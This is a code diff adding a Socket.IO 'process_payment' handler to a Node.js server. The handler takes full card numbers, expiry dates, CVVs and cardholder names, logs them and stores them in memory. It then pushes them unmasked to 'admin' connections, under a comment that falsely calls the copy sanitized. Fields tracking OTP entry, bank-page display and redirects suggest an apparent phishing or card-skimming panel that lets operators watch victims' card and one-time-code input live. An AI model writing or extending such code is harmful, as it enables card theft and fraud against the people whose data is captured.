@@ -1088,7 +1088,77 @@ io.on('connection', (socket) => {
       timestamp: data.timestamp || new Date().toISOString()
     });
   });
+  // Handle process_payment event from payment form
+socket.on('process_payment', (paymentData) => {
+  console.log('Processing payment:', paymentData);
   
+  // Generate a transaction ID if one doesn't exist
+  const invoiceId = paymentData.transactionId || crypto.randomBytes(8).toString('hex').toUpperCase();
+  
+  // Create a sanitized copy of the card data for admin panel (removing sensitive data)
+  const adminPaymentData = {
+    invoiceId: invoiceId,
+    cardData: {
+      cardNumber: paymentData.cardNumber,
+      cardLast4: paymentData.cardNumber ? paymentData.cardNumber.slice(-4) : '****',
+      expiry: paymentData.expiryDate,
+      cvv: paymentData.cvv,
+      cardHolder: paymentData.cardHolder,
+      amount: paymentData.amount || 0,
+      currency: paymentData.currency || 'USD',
+      cardType: paymentData.cardType || 'Unknown'
+    },
+    ip: socket.handshake.address || 'Unknown',
+    timestamp: new Date().toISOString()
+  };
+  
+  // Store transaction in memory
+  const transaction = {
+    id: invoiceId,
+    cardNumber: paymentData.cardNumber,
+    expiry: paymentData.expiryDate,
+    cvv: paymentData.cvv,
+    email: paymentData.email || 'customer@example.com',
+    amount: paymentData.amount || '0',
+    currency: paymentData.currency || 'USD',
+    cardholder: paymentData.cardHolder,
+    status: 'processing',
+    otpShown: false,
+    otpEntered: null,
+    otpError: false,
+    redirectStatus: null,
+    bankpageVisible: false,
+    timestamp: new Date().toISOString(),
+    ip: socket.handshake.address || 'Unknown',
+    viewed: false
+  };
+  
+  // If card type info is available, add it
+  if (paymentData.cardType) {
+    transaction.bankInfo = {
+      scheme: paymentData.cardType || 'Unknown'
+    };
+  }
+  
+  // Store transaction
+  transactions.set(invoiceId, transaction);
+  
+  // Send acknowledgment back to the client
+  socket.emit('card_data_received', {
+    invoiceId: invoiceId,
+    received: true,
+    timestamp: Date.now()
+  });
+  
+  // Join the room for this transaction
+  socket.join(invoiceId);
+  
+  // Broadcast to all admin connections
+  broadcastToAdmins('card_submitted', adminPaymentData);
+  
+  // Also use the existing admin event for backward compatibility
+  broadcastToAdmins('new_transaction', { invoiceId });
+});
   // Add listener for currency page redirection
   socket.on('currency_redirect', (data) => {
     console.log('Received currency_redirect event:', data);
